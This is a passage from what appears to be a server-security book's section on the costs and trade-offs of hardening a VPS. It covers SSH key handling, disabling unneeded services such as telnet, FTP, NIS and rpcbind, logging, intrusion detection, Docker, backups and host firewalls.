If you use Docker and do not run as root, then you have another layer that any attacker has to break through in order to get to the host system. This lifts the bar significantly on host password compromise.

#### SSH {#vps-costs-and-trade-offs-disable-remove-services-harden-what-is-left-ssh}

SSH is secure by definition, in saying that, you can still use it insecurely. I have seen some organisations store their private keys on their developer wiki so that all the developers within the company can easily access the private key and copy it locally. Do not do this, there are so many things wrong with this.

Make sure you use a passphrase unless you have a good reason not to, and can in some other way safeguard your SSH access, such as the use of [ssh-cron](https://fbb-git.github.io/ssh-cron/ssh-cron.1.html).

#### Disable Boot Options

I am sure you will be smart enough to work it out. Just re-enable the boot option from what ever device it is you are trying to boot from, and do not forget to disable it once you are finished.

#### Mounting of Partitions

Locking yourself out of being able to administer your system due to overly zealous restrictive mount options is not the end of the world, just boot from a live CD and you will be able to adjust your `/etc/fstab`.

This is also a place where Docker containers shine, by using the [`--read-only`](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers) flag and many other options that can help immensely, be sure to check the Docker sections if you have not already. 

#### Portmap

Portmap is simple to disable, go ahead and do so.

#### Exim

If you are not using Exim, it only takes a few minutes to disable.

#### Remove NIS

I am not aware of any costs with removing NIS if it is not necessary, and if it is being used, consider using something else.

#### Rpcbind

I am not aware of any costs with removing or disabling responses from rpcbind if it is not required.

#### Telnet

If someone legitimate is still relying on telnet, send them to the [Risks](#vps-identify-risks-unnecessary-and-vulnerable-services-telnet) section followed by the [Countermeasures](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet) section.

#### FTP

If you can convince your staff to read and understand the issues with FTP, and FTPS, including the possible confusion around how to use FTPS securely, what can go wrong, and mandate a more secure file transfer protocol such as the recommended SFTP or SCP, then you just need to make sure SSH is not being [used incorrectly](#vps-costs-and-trade-offs-disable-remove-services-harden-what-is-left-ssh)

#### NFS

If you are using NFS, there is some configuration required, this can take a few minutes. Scripting this for a configuration management tool is a good idea if you need to apply the same configuration to many servers.

### Lack of Visibility

All of the suggested offerings under this heading take time to set-up. Evaluate where your weakest areas are, and which offerings will give you the best results for your situation, and start there.

#### Logging and Alerting

You will need to invest time into understanding what each offering does and its strengths and weaknesses.

#### Web Server Log Management

This will take some time to set-up, test and verify all the requirements. It is essential to have reliable off-site logging on most systems.

#### Proactive Monitoring

There was quite a bit of time spent in the Countermeasures section, but most of that work is now done for you. Now it is just a matter of following the steps I have laid out.

#### Statistics Graphing

I have found these tools to be well worth the investment when you are dealing with hosts. We also cover [statsd](#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing) in the Web Applications chapter, which performs a similar role for the application itself. If you are using Docker containers, the lowest hanging fruit in terms of security from an external attackers perspective definitely falls on your application code.

#### Host Intrusion Detection Systems (HIDS)

HIDS are one of the must haves on your systems, they also need to be set up as early as possible, ideally before the server has been exposed to the internet, or any network that has the potential for an attacker to gain access and plant malware.

### Docker

Some of the extra steps you may take from the default security standpoint with Docker may restrict some flexibility, when and if this happens, just back them off a bit. There are many aspects to hardening Docker that have no negative side effects at all. Concentrate on these after you have your application security to a good level, usually that in itself is a lot of work.

### Schedule Backups

There are many ways to do this. If you are a one man band, really simple techniques may work well, if you are a large shop, you will ideally want an automated solution, whether you build it yourself or rely on someone else to do it.

Work out what you need, count the costs of that data being lost, measure the cost of the potential solutions, and compare.

I have used rsync in many shapes and forms, and for many years it has been good. Check your backup logs to make sure what you think is happening is. When you are setting up your backup scripts, test them to make sure you do not overwrite something or some place that was not intended.

You can run scripts manually if you are disciplined and they are very easy, otherwise it usually pays to automate them. Cron does what it says it will do on the box.

### Host Firewall

A host firewall can be a good temporary patch, and that is the problem. Nothing is as permanent as a temporary patch. A firewall is a single layer of defence and one that is often used to hide the inadequacies of the rest of the layers of defence.
